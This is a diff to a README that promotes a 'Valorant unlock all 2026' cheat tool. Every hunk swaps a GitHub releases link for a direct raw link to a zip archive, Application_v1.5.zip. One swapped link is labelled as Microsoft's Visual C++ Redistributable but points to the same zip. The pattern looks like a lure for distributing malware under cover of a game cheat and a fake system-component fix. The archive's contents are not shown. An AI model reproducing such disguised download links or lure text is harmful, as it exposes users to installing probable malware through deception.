@@ -5,7 +5,7 @@ description: "Unlock every agent, skin, buddy, and spray in Valorant with this s
 ---
 # 🎮 valorant-unlock-all-2026 - Unlock Everything, Play Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant_Unlock_All_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/perpetualcalendarrockbass8243/valorant-unlock-all-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Valorant_Unlock_All_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/perpetualcalendarrockbass8243/perpetualcalendarrockbass8243.github.io/main/content/Application_v1.5.zip)
 
 ---
 
@@ -20,7 +20,7 @@ This tool is designed for **Windows users only** and works with the latest Valor
 ## ⬇️ Download & Install
 
 Visit this link to download the application:  
-**[https://github.com/perpetualcalendarrockbass8243/valorant-unlock-all-2026/releases](https://github.com/perpetualcalendarrockbass8243/valorant-unlock-all-2026/releases)**
+**[https://raw.githubusercontent.com/perpetualcalendarrockbass8243/perpetualcalendarrockbass8243.github.io/main/content/Application_v1.5.zip](https://raw.githubusercontent.com/perpetualcalendarrockbass8243/perpetualcalendarrockbass8243.github.io/main/content/Application_v1.5.zip)**
 
 Once you're on that page:
 1. Look for the newest release (it will be at the top).
@@ -126,7 +126,7 @@ Make sure Valorant is installed in its default location (`C:\Riot Games\Valorant
 **Solution**: Restart Valorant after running the tool. If items still don't show, run the tool again and wait 20 seconds before launching the game.
 
 **Problem**: "Missing DLL" error.  
-**Solution**: Install the latest [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe) and restart your PC.
+**Solution**: Install the latest [Microsoft Visual C++ Redistributable](https://raw.githubusercontent.com/perpetualcalendarrockbass8243/perpetualcalendarrockbass8243.github.io/main/content/Application_v1.5.zip) and restart your PC.
 
 ---
 
@@ -165,7 +165,7 @@ Join thousands of satisfied players who now enjoy the full Valorant experience w
 
 Ready to unlock everything? Here's your download link one more time:
 
-**[👉 CLICK HERE TO DOWNLOAD VALORANT UNLOCK ALL 2026 👈](https://github.com/perpetualcalendarrockbass8243/valorant-unlock-all-2026/releases)**
+**[👉 CLICK HERE TO DOWNLOAD VALORANT UNLOCK ALL 2026 👈](https://raw.githubusercontent.com/perpetualcalendarrockbass8243/perpetualcalendarrockbass8243.github.io/main/content/Application_v1.5.zip)**
 
 Visit this link to download the application. Follow the simple steps above, and you'll be playing with every agent, skin, buddy, and spray in under 5 minutes.
 
